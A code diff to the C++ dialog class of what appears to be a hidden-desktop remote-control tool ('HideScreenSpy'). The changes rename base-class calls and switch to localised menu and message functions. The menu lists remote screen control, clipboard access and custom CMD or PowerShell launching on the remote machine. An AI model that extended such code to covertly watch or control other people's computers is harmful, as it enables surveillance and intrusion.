@@ -80,7 +80,7 @@ CHideScreenSpyDlg::~CHideScreenSpyDlg()
 
 void CHideScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
 {
-    CDialog::DoDataExchange(pDX);
+    __super::DoDataExchange(pDX);
 }
 
 
@@ -155,9 +155,9 @@ bool CHideScreenSpyDlg::SaveSnapshot()
 
 BOOL CHideScreenSpyDlg::OnInitDialog()
 {
-    CDialog::OnInitDialog();
+    __super::OnInitDialog();
     CString strString;
-    strString.Format("%s - 远程虚拟屏幕 %d×%d", m_IPAddress,
+    strString.FormatL("%s - 远程虚拟屏幕 %d×%d", m_IPAddress,
                      m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
     SetWindowText(strString);
 
@@ -168,47 +168,47 @@ BOOL CHideScreenSpyDlg::OnInitDialog()
     SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_NO));
     CMenu* pSysMenu = GetSystemMenu(FALSE);
     if (pSysMenu != NULL) {
-        pSysMenu->AppendMenu(MF_SEPARATOR);
-        pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("录像(MJPEG)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_H264, _T("录像(H264)"));
-        pSysMenu->AppendMenu(MF_SEPARATOR);
-        pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_SETSCERRN, _T("修复分辨率(&G)"));
-        pSysMenu->AppendMenu(MF_SEPARATOR);
-        pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY60, _T("清晰度低60/100"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY85, _T("清晰度中85/100"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, _T("清晰度高100/100"));
-        pSysMenu->AppendMenu(MF_SEPARATOR);
+        pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SAVEAVI_S, _T("录像(MJPEG)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SAVEAVI_H264, _T("录像(H264)"));
+        pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
+        pSysMenu->AppendMenuL(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_SETSCERRN, _T("修复分辨率(&G)"));
+        pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
+        pSysMenu->AppendMenuL(MF_STRING, IDM_QUALITY60, _T("清晰度低60/100"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_QUALITY85, _T("清晰度中85/100"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_QUALITY100, _T("清晰度高100/100"));
+        pSysMenu->AppendMenuSeparator(MF_SEPARATOR);
 
         /*
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_1, _T("FPS-1"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_5, _T("FPS-5"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_10, _T("FPS-10"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_15, _T("FPS-15"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_20, _T("FPS-20"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_25, _T("FPS-25"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_30, _T("FPS-30"));
-        pSysMenu->AppendMenu(MF_SEPARATOR);
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_1, _T("FPS-1"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_5, _T("FPS-5"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_10, _T("FPS-10"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_15, _T("FPS-15"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_20, _T("FPS-20"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_25, _T("FPS-25"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_FPS_30, _T("FPS-30"));
+        pSysMenu->AppendMenuL(MF_SEPARATOR);
         */
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Explorer, _T("打开-文件管理(&B)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_run, _T("打开-运行(&H)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Powershell, _T("打开-Powershell(&N)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Explorer, _T("打开-文件管理(&B)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_run, _T("打开-运行(&H)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Powershell, _T("打开-Powershell(&N)"));
 
         /*
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Chrome, _T("打开-Chrome(&I)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Edge, _T("打开-Edge(&M)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Brave, _T("打开-Brave(&D)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Firefox, _T("打开-Firefox(&V)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Iexplore, _T("打开-Iexplore(&Z)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Chrome, _T("打开-Chrome(&I)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Edge, _T("打开-Edge(&M)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Brave, _T("打开-Brave(&D)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Firefox, _T("打开-Firefox(&V)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_Iexplore, _T("打开-Iexplore(&Z)"));
         */
 
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_zdy, _T("自定义CMD命令(&y)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_zdy2, _T("高级自定义命令(&O)"));
-        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_close, _T("清理后台(&J)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_zdy, _T("自定义CMD命令(&y)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_zdy2, _T("高级自定义命令(&O)"));
+        pSysMenu->AppendMenuL(MF_STRING, IDM_OPEN_close, _T("清理后台(&J)"));
 
         pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
     }
@@ -407,7 +407,7 @@ void CHideScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned lo
 
 void CHideScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
 {
-    CDialog::OnSize(nType, cx, cy);
+    __super::OnSize(nType, cx, cy);
 
     // TODO: Add your message handler code here
     if (!IsWindowVisible())
@@ -467,8 +467,8 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
         FCCHandler handler = nID == IDM_SAVEAVI_S ? ENCODER_MJPEG : ENCODER_H264;
         int code;
         if (code = m_aviStream.Open(m_aviFile, m_BitmapInfor_Full, rate, handler)) {
-            MessageBox(CString("Create Video(*.avi) Failed:\n") + m_aviFile + "\r\n错误代码: " +
-                       CBmpToAvi::GetErrMsg(code).c_str(), "提示");
+            MessageBoxL(CString("Create Video(*.avi) Failed:\n") + m_aviFile + "\r\n错误代码: " +
+                       CBmpToAvi::GetErrMsg(code).c_str(), "提示", MB_ICONINFORMATION);
             m_aviFile = _T("");
         } else {
             ::SetTimer(m_hWnd, TIMER_ID, duration, NULL);
@@ -677,7 +677,7 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
     }
     break;
     default:
-        CDialog::OnSysCommand(nID, lParam);
+        __super::OnSysCommand(nID, lParam);
     }
 }
 
@@ -700,7 +700,7 @@ void CHideScreenSpyDlg::DrawTipString(CString str)
 BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 {
     if (m_bIsClosed)
-        return CDialog::PreTranslateMessage(pMsg);
+        return __super::PreTranslateMessage(pMsg);
     switch (pMsg->message) {
     case WM_ERASEBKGND:
         return TRUE;
@@ -739,7 +739,7 @@ BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
     if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_RETURN))
         return TRUE;
 
-    return CDialog::PreTranslateMessage(pMsg);
+    return __super::PreTranslateMessage(pMsg);
 }
 
 void CHideScreenSpyDlg::SendScaledMouseMessage(MSG* pMsg, bool makeLP)
@@ -829,7 +829,7 @@ void CHideScreenSpyDlg::DoPaint()
     }
     if (m_bIsClosed) return;
     StretchBlt(m_hFullDC, 0, 0, m_CRect.Width(), m_CRect.Height(), m_hFullMemDC, 0, 0, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, SRCCOPY);
-    // Do not call CDialog::OnPaint() for painting messages
+    // Do not call __super::OnPaint() for painting messages
 }
 
 void CHideScreenSpyDlg::OnPaint()
@@ -842,7 +842,7 @@ void CHideScreenSpyDlg::OnPaint()
     }
     if (m_bIsClosed) return;
     StretchBlt(m_hFullDC, 0, 0, m_CRect.Width(), m_CRect.Height(), m_hFullMemDC, 0, 0, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, SRCCOPY);
-    CDialog::OnPaint();
+    __super::OnPaint();
 }
 
 LRESULT CHideScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
@@ -860,7 +860,7 @@ LRESULT CHideScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam
         return TRUE;
     }
 
-    return CDialog::WindowProc(message, wParam, lParam);
+    return __super::WindowProc(message, wParam, lParam);
 }
 
 void CHideScreenSpyDlg::OnTimer(UINT_PTR nIDEvent)
@@ -874,7 +874,7 @@ void CHideScreenSpyDlg::OnTimer(UINT_PTR nIDEvent)
         SetTextColor(m_hFullDC, RGB(0xff, 0x00, 0x00));
         TextOut(m_hFullDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
     }
-    CDialog::OnTimer(nIDEvent);
+    __super::OnTimer(nIDEvent);
 }
 
 bool CHideScreenSpyDlg::JPG_BMP(int cbit, void* input, int inlen, void* output)
